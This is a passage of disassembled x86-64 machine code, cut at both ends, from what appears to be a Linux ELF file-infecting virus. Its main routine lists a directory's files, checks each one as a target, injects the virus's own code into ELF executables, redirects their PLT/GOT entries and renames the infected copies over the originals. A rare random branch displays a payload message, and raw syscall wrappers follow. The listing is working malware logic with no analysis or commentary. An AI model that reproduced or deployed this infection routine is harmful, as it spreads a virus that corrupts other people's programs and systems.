  401d71:	48 89 85 f8 7c ff ff 	mov    QWORD PTR [rbp-0x8308],rax
  401d78:	66 c7 85 de 7c ff ff 	mov    WORD PTR [rbp-0x8322],0x2e
  401d7f:	2e 00 
  401d81:	b8 00 00 00 00       	mov    eax,0x0
  401d86:	e8 f9 02 00 00       	call   402084 <_getuid>
  401d8b:	85 c0                	test   eax,eax
  401d8d:	74 09                	je     401d98 <do_main+0xa5>
  401d8f:	48 8d 85 de 7c ff ff 	lea    rax,[rbp-0x8322]
  401d96:	eb 0f                	jmp    401da7 <do_main+0xb4>
  401d98:	48 8d 85 e0 7c ff ff 	lea    rax,[rbp-0x8320]
  401d9f:	48 89 c7             	mov    rdi,rax
  401da2:	e8 b5 e6 ff ff       	call   40045c <randomly_select_dir>
  401da7:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401dab:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401daf:	48 8d 35 fd 10 00 00 	lea    rsi,[rip+0x10fd]        # 402eb3 <display_skeksi+0x135>
  401db6:	48 89 c7             	mov    rdi,rax
  401db9:	e8 cb 0e 00 00       	call   402c89 <_strcmp>
  401dbe:	85 c0                	test   eax,eax
  401dc0:	75 07                	jne    401dc9 <do_main+0xd6>
  401dc2:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [rbp-0x8],0x1
  401dc9:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401dcd:	ba 00 00 00 00       	mov    edx,0x0
  401dd2:	be 00 00 01 00       	mov    esi,0x10000
  401dd7:	48 89 c7             	mov    rdi,rax
  401dda:	e8 e2 02 00 00       	call   4020c1 <_open>
  401ddf:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax
  401de2:	83 7d e4 00          	cmp    DWORD PTR [rbp-0x1c],0x0
  401de6:	0f 88 92 02 00 00    	js     40207e <do_main+0x38b>
  401dec:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401df3:	48 89 c7             	mov    rdi,rax
  401df6:	e8 92 f0 ff ff       	call   400e8d <load_self>
  401dfb:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401dfe:	48 8d 8d 90 7f ff ff 	lea    rcx,[rbp-0x8070]
  401e05:	ba 00 80 00 00       	mov    edx,0x8000
  401e0a:	48 89 ce             	mov    rsi,rcx
  401e0d:	89 c7                	mov    edi,eax
  401e0f:	e8 92 05 00 00       	call   4023a6 <_getdents64>
  401e14:	89 45 e0             	mov    DWORD PTR [rbp-0x20],eax
  401e17:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401e1b:	0f 88 60 02 00 00    	js     402081 <do_main+0x38e>
  401e21:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401e25:	0f 84 f5 01 00 00    	je     402020 <do_main+0x32d>
  401e2b:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
  401e32:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401e39:	e9 d1 01 00 00       	jmp    40200f <do_main+0x31c>
  401e3e:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401e41:	48 98                	cdqe   
  401e43:	48 8d 95 90 7f ff ff 	lea    rdx,[rbp-0x8070]
  401e4a:	48 01 d0             	add    rax,rdx
  401e4d:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401e51:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e55:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401e59:	0f b7 c0             	movzx  eax,ax
  401e5c:	83 e8 01             	sub    eax,0x1
  401e5f:	01 45 fc             	add    DWORD PTR [rbp-0x4],eax
  401e62:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e66:	48 83 c0 13          	add    rax,0x13
  401e6a:	48 8d 35 44 10 00 00 	lea    rsi,[rip+0x1044]        # 402eb5 <display_skeksi+0x137>
  401e71:	48 89 c7             	mov    rdi,rax
  401e74:	e8 10 0e 00 00       	call   402c89 <_strcmp>
  401e79:	85 c0                	test   eax,eax
  401e7b:	0f 84 80 01 00 00    	je     402001 <do_main+0x30e>
  401e81:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e85:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
  401e89:	3c 2e                	cmp    al,0x2e
  401e8b:	0f 84 73 01 00 00    	je     402004 <do_main+0x311>
  401e91:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401e95:	48 8d 48 13          	lea    rcx,[rax+0x13]
  401e99:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  401e9d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401ea1:	48 89 c6             	mov    rsi,rax
  401ea4:	48 89 cf             	mov    rdi,rcx
  401ea7:	e8 00 e6 ff ff       	call   4004ac <full_path>
  401eac:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401eb0:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401eb4:	48 89 c7             	mov    rdi,rax
  401eb7:	e8 b9 fc ff ff       	call   401b75 <check_criteria>
  401ebc:	85 c0                	test   eax,eax
  401ebe:	0f 88 43 01 00 00    	js     402007 <do_main+0x314>
  401ec4:	83 7d f4 00          	cmp    DWORD PTR [rbp-0xc],0x0
  401ec8:	74 43                	je     401f0d <do_main+0x21a>
  401eca:	c7 45 9c 0a 00 00 00 	mov    DWORD PTR [rbp-0x64],0xa
  401ed1:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401ed8:	be 00 00 00 00       	mov    esi,0x0
  401edd:	48 89 c7             	mov    rdi,rax
  401ee0:	e8 f5 04 00 00       	call   4023da <_gettimeofday>
  401ee5:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401eec:	48 83 c0 08          	add    rax,0x8
  401ef0:	48 89 c7             	mov    rdi,rax
  401ef3:	e8 20 e5 ff ff       	call   400418 <_rand>
  401ef8:	99                   	cdq    
  401ef9:	f7 7d 9c             	idiv   DWORD PTR [rbp-0x64]
  401efc:	89 d0                	mov    eax,edx
  401efe:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401f01:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  401f05:	0f 85 ff 00 00 00    	jne    40200a <do_main+0x317>
  401f0b:	eb 01                	jmp    401f0e <do_main+0x21b>
  401f0d:	90                   	nop
  401f0e:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401f15:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401f19:	48 89 d6             	mov    rsi,rdx
  401f1c:	48 89 c7             	mov    rdi,rax
  401f1f:	e8 8a f0 ff ff       	call   400fae <load_target>
  401f24:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401f2b:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401f32:	48 89 d6             	mov    rsi,rdx
  401f35:	48 89 c7             	mov    rdi,rax
  401f38:	e8 21 e9 ff ff       	call   40085e <infect_elf_file>
  401f3d:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401f41:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f48:	48 89 c7             	mov    rdi,rax
  401f4b:	e8 1f f0 ff ff       	call   400f6f <unload_target>
  401f50:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401f57:	48 89 c6             	mov    rsi,rax
  401f5a:	48 8d 3d af 0e 00 00 	lea    rdi,[rip+0xeaf]        # 402e10 <display_skeksi+0x92>
  401f61:	e8 5f f4 ff ff       	call   4013c5 <load_target_writeable>
  401f66:	e8 d7 0d 00 00       	call   402d42 <get_rip>
  401f6b:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  401f72:	48 89 d1             	mov    rcx,rdx
  401f75:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  401f7c:	48 29 d1             	sub    rcx,rdx
  401f7f:	48 89 ca             	mov    rdx,rcx
  401f82:	48 29 d0             	sub    rax,rdx
  401f85:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  401f89:	e8 b4 0d 00 00       	call   402d42 <get_rip>
  401f8e:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  401f95:	48 89 d1             	mov    rcx,rdx
  401f98:	48 c7 c2 e1 01 40 00 	mov    rdx,0x4001e1
  401f9f:	48 29 d1             	sub    rcx,rdx
  401fa2:	48 89 ca             	mov    rdx,rcx
  401fa5:	48 29 d0             	sub    rax,rdx
  401fa8:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  401fac:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401fb0:	48 2b 45 b0          	sub    rax,QWORD PTR [rbp-0x50]
  401fb4:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401fb8:	48 8b 55 b8          	mov    rdx,QWORD PTR [rbp-0x48]
  401fbc:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401fc0:	48 01 d0             	add    rax,rdx
  401fc3:	48 8d 50 40          	lea    rdx,[rax+0x40]
  401fc7:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401fce:	48 89 d6             	mov    rsi,rdx
  401fd1:	48 89 c7             	mov    rdi,rax
  401fd4:	e8 03 f8 ff ff       	call   4017dc <infect_pltgot>
  401fd9:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401fe0:	48 89 c7             	mov    rdi,rax
  401fe3:	e8 87 ef ff ff       	call   400f6f <unload_target>
  401fe8:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401fec:	48 89 c6             	mov    rsi,rax
  401fef:	48 8d 3d 1a 0e 00 00 	lea    rdi,[rip+0xe1a]        # 402e10 <display_skeksi+0x92>
  401ff6:	e8 da 01 00 00       	call   4021d5 <_rename>
  401ffb:	83 45 f4 01          	add    DWORD PTR [rbp-0xc],0x1
  401fff:	eb 0a                	jmp    40200b <do_main+0x318>
  402001:	90                   	nop
  402002:	eb 07                	jmp    40200b <do_main+0x318>
  402004:	90                   	nop
  402005:	eb 04                	jmp    40200b <do_main+0x318>
  402007:	90                   	nop
  402008:	eb 01                	jmp    40200b <do_main+0x318>
  40200a:	90                   	nop
  40200b:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40200f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  402012:	3b 45 e0             	cmp    eax,DWORD PTR [rbp-0x20]
  402015:	0f 8c 23 fe ff ff    	jl     401e3e <do_main+0x14b>
  40201b:	e9 db fd ff ff       	jmp    401dfb <do_main+0x108>
  402020:	90                   	nop
  402021:	83 6d f8 01          	sub    DWORD PTR [rbp-0x8],0x1
  402025:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  402029:	7e 0f                	jle    40203a <do_main+0x347>
  40202b:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  40202e:	89 c7                	mov    edi,eax
  402030:	e8 c2 00 00 00       	call   4020f7 <_close>
  402035:	e9 47 fd ff ff       	jmp    401d81 <do_main+0x8e>
  40203a:	c7 45 98 32 00 00 00 	mov    DWORD PTR [rbp-0x68],0x32
  402041:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  402048:	be 00 00 00 00       	mov    esi,0x0
  40204d:	48 89 c7             	mov    rdi,rax
  402050:	e8 85 03 00 00       	call   4023da <_gettimeofday>
  402055:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  40205c:	48 83 c0 08          	add    rax,0x8
  402060:	48 89 c7             	mov    rdi,rax
  402063:	e8 b0 e3 ff ff       	call   400418 <_rand>
  402068:	99                   	cdq    
  402069:	f7 7d 98             	idiv   DWORD PTR [rbp-0x68]
  40206c:	89 d0                	mov    eax,edx
  40206e:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  402071:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  402075:	75 0b                	jne    402082 <do_main+0x38f>
  402077:	e8 02 0d 00 00       	call   402d7e <display_skeksi>
  40207c:	eb 04                	jmp    402082 <do_main+0x38f>
  40207e:	90                   	nop
  40207f:	eb 01                	jmp    402082 <do_main+0x38f>
  402081:	90                   	nop
  402082:	c9                   	leave  
  402083:	c3                   	ret    

0000000000402084 <_getuid>:
  402084:	f3 0f 1e fa          	endbr64 
  402088:	55                   	push   rbp
  402089:	48 89 e5             	mov    rbp,rsp
  40208c:	48 c7 c0 66 00 00 00 	mov    rax,0x66
  402093:	0f 05                	syscall 
  402095:	48 89 c0             	mov    rax,rax
  402098:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40209c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020a0:	5d                   	pop    rbp
  4020a1:	c3                   	ret    

00000000004020a2 <Exit>:
  4020a2:	f3 0f 1e fa          	endbr64 
  4020a6:	55                   	push   rbp
  4020a7:	48 89 e5             	mov    rbp,rsp
  4020aa:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  4020ae:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020b2:	48 89 c7             	mov    rdi,rax
  4020b5:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  4020bc:	0f 05                	syscall 
  4020be:	90                   	nop
  4020bf:	5d                   	pop    rbp
  4020c0:	c3                   	ret    

00000000004020c1 <_open>:
  4020c1:	f3 0f 1e fa          	endbr64 
  4020c5:	55                   	push   rbp
  4020c6:	48 89 e5             	mov    rbp,rsp
  4020c9:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4020cd:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4020d1:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4020d5:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4020d9:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4020dd:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4020e1:	48 c7 c0 02 00 00 00 	mov    rax,0x2
  4020e8:	0f 05                	syscall 
  4020ea:	48 89 c0             	mov    rax,rax
  4020ed:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4020f1:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4020f5:	5d                   	pop    rbp
  4020f6:	c3                   	ret    

00000000004020f7 <_close>:
  4020f7:	f3 0f 1e fa          	endbr64 
  4020fb:	55                   	push   rbp
  4020fc:	48 89 e5             	mov    rbp,rsp
  4020ff:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402102:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402106:	48 c7 c0 03 00 00 00 	mov    rax,0x3
  40210d:	0f 05                	syscall 
  40210f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402113:	5d                   	pop    rbp
  402114:	c3                   	ret    

0000000000402115 <_read>:
  402115:	f3 0f 1e fa          	endbr64 
  402119:	55                   	push   rbp
  40211a:	48 89 e5             	mov    rbp,rsp
  40211d:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402121:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402125:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402129:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40212d:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402131:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402135:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  40213c:	0f 05                	syscall 
  40213e:	48 89 c0             	mov    rax,rax
  402141:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402145:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402149:	5d                   	pop    rbp
  40214a:	c3                   	ret    

000000000040214b <_write>:
  40214b:	f3 0f 1e fa          	endbr64 
  40214f:	55                   	push   rbp
  402150:	48 89 e5             	mov    rbp,rsp
  402153:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402157:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40215b:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40215f:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402163:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402167:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40216b:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  402172:	0f 05                	syscall 
  402174:	48 89 c0             	mov    rax,rax
  402177:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40217b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40217f:	5d                   	pop    rbp
  402180:	c3                   	ret    

0000000000402181 <_fstat>:
  402181:	f3 0f 1e fa          	endbr64 
  402185:	55                   	push   rbp
  402186:	48 89 e5             	mov    rbp,rsp
  402189:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40218d:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402191:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402195:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402199:	48 c7 c0 05 00 00 00 	mov    rax,0x5
  4021a0:	0f 05                	syscall 
  4021a2:	48 89 c0             	mov    rax,rax
  4021a5:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021a9:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021ad:	5d                   	pop    rbp
  4021ae:	c3                   	ret    

00000000004021af <_unlink>:
  4021af:	f3 0f 1e fa          	endbr64 
  4021b3:	55                   	push   rbp
  4021b4:	48 89 e5             	mov    rbp,rsp
  4021b7:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021bb:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4021bf:	48 c7 c0 57 00 00 00 	mov    rax,0x57
  4021c6:	0f 05                	syscall 
  4021c8:	48 89 c0             	mov    rax,rax
  4021cb:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021cf:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021d3:	5d                   	pop    rbp
  4021d4:	c3                   	ret    

00000000004021d5 <_rename>:
  4021d5:	f3 0f 1e fa          	endbr64 
  4021d9:	55                   	push   rbp
  4021da:	48 89 e5             	mov    rbp,rsp
  4021dd:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021e1:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4021e5:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4021e9:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021ed:	48 c7 c0 52 00 00 00 	mov    rax,0x52
  4021f4:	0f 05                	syscall 
  4021f6:	48 89 c0             	mov    rax,rax
  4021f9:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021fd:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402201:	5d                   	pop    rbp
  402202:	c3                   	ret    

0000000000402203 <_lseek>:
  402203:	f3 0f 1e fa          	endbr64 
  402207:	55                   	push   rbp
  402208:	48 89 e5             	mov    rbp,rsp
  40220b:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40220f:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402213:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402216:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40221a:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40221e:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  402222:	48 c7 c0 08 00 00 00 	mov    rax,0x8
  402229:	0f 05                	syscall 
  40222b:	48 89 c0             	mov    rax,rax
  40222e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402232:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402236:	5d                   	pop    rbp
  402237:	c3                   	ret    

0000000000402238 <_fsync>:
  402238:	f3 0f 1e fa          	endbr64 
  40223c:	55                   	push   rbp
  40223d:	48 89 e5             	mov    rbp,rsp
  402240:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402243:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  402247:	48 c7 c0 4a 00 00 00 	mov    rax,0x4a
  40224e:	0f 05                	syscall 
  402250:	48 89 c0             	mov    rax,rax
  402253:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402257:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40225b:	5d                   	pop    rbp
  40225c:	c3                   	ret    

000000000040225d <_mmap>:
  40225d:	f3 0f 1e fa          	endbr64 
  402261:	55                   	push   rbp
  402262:	48 89 e5             	mov    rbp,rsp
  402265:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  402269:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  40226d:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  402271:	48 89 4d c0          	mov    QWORD PTR [rbp-0x40],rcx
  402275:	4c 89 45 b8          	mov    QWORD PTR [rbp-0x48],r8
  402279:	4c 89 4d b0          	mov    QWORD PTR [rbp-0x50],r9
  40227d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  402281:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402285:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  402289:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40228d:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  402291:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  402295:	48 8b 7d d8          	mov    rdi,QWORD PTR [rbp-0x28]
  402299:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  40229d:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  4022a1:	4c 8b 55 c0          	mov    r10,QWORD PTR [rbp-0x40]
  4022a5:	4c 8b 45 f8          	mov    r8,QWORD PTR [rbp-0x8]
  4022a9:	4c 8b 4d f0          	mov    r9,QWORD PTR [rbp-0x10]
  4022ad:	48 c7 c0 09 00 00 00 	mov    rax,0x9
  4022b4:	0f 05                	syscall 
  4022b6:	48 89 c0             	mov    rax,rax
  4022b9:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  4022bd:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  4022c1:	5d                   	pop    rbp
  4022c2:	c3                   	ret    

00000000004022c3 <_munmap>:
  4022c3:	f3 0f 1e fa          	endbr64 
  4022c7:	55                   	push   rbp
  4022c8:	48 89 e5             	mov    rbp,rsp
  4022cb:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022cf:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022d3:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022d7:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022db:	48 c7 c0 0b 00 00 00 	mov    rax,0xb
  4022e2:	0f 05                	syscall 
  4022e4:	48 89 c0             	mov    rax,rax
  4022e7:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022eb:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022ef:	5d                   	pop    rbp
  4022f0:	c3                   	ret    

00000000004022f1 <_mprotect>:
  4022f1:	f3 0f 1e fa          	endbr64 
  4022f5:	55                   	push   rbp
  4022f6:	48 89 e5             	mov    rbp,rsp
  4022f9:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4022fd:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402301:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402304:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402308:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40230c:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  402310:	48 c7 c0 0a 00 00 00 	mov    rax,0xa
  402317:	0f 05                	syscall 
  402319:	48 89 c0             	mov    rax,rax
  40231c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402320:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402324:	5d                   	pop    rbp
  402325:	c3                   	ret    

0000000000402326 <_ptrace>:
  402326:	f3 0f 1e fa          	endbr64 
  40232a:	55                   	push   rbp
  40232b:	48 89 e5             	mov    rbp,rsp
  40232e:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402332:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402336:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40233a:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  40233e:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402342:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402346:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40234a:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  40234e:	48 c7 c0 65 00 00 00 	mov    rax,0x65
  402355:	0f 05                	syscall 
  402357:	48 89 c0             	mov    rax,rax
  40235a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40235e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402362:	5d                   	pop    rbp
  402363:	c3                   	ret    

0000000000402364 <_prctl>:
  402364:	f3 0f 1e fa          	endbr64 
  402368:	55                   	push   rbp
  402369:	48 89 e5             	mov    rbp,rsp
  40236c:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402370:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402374:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  402378:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  40237c:	4c 89 45 c8          	mov    QWORD PTR [rbp-0x38],r8
  402380:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402384:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402388:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40238c:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402390:	48 c7 c0 9d 00 00 00 	mov    rax,0x9d
  402397:	0f 05                	syscall 
  402399:	48 89 c0             	mov    rax,rax
  40239c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023a0:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023a4:	5d                   	pop    rbp
  4023a5:	c3                   	ret    

00000000004023a6 <_getdents64>:
  4023a6:	f3 0f 1e fa          	endbr64 
  4023aa:	55                   	push   rbp
  4023ab:	48 89 e5             	mov    rbp,rsp
  4023ae:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4023b1:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4023b5:	89 55 e8             	mov    DWORD PTR [rbp-0x18],edx
  4023b8:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4023bc:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023c0:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  4023c4:	48 c7 c0 d9 00 00 00 	mov    rax,0xd9
  4023cb:	0f 05                	syscall 
  4023cd:	48 89 c0             	mov    rax,rax
  4023d0:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023d4:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023d8:	5d                   	pop    rbp
  4023d9:	c3                   	ret    

00000000004023da <_gettimeofday>:
  4023da:	f3 0f 1e fa          	endbr64 
  4023de:	55                   	push   rbp
  4023df:	48 89 e5             	mov    rbp,rsp
  4023e2:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4023e6:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4023ea:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4023ee:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023f2:	48 c7 c0 60 00 00 00 	mov    rax,0x60
  4023f9:	0f 05                	syscall 
  4023fb:	48 89 c0             	mov    rax,rax
  4023fe:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402402:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402406:	5d                   	pop    rbp
  402407:	c3                   	ret    

0000000000402408 <_memcpy>:
  402408:	f3 0f 1e fa          	endbr64 
  40240c:	55                   	push   rbp
  40240d:	48 89 e5             	mov    rbp,rsp
  402410:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  402414:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  402418:	89 55 cc             	mov    DWORD PTR [rbp-0x34],edx
  40241b:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
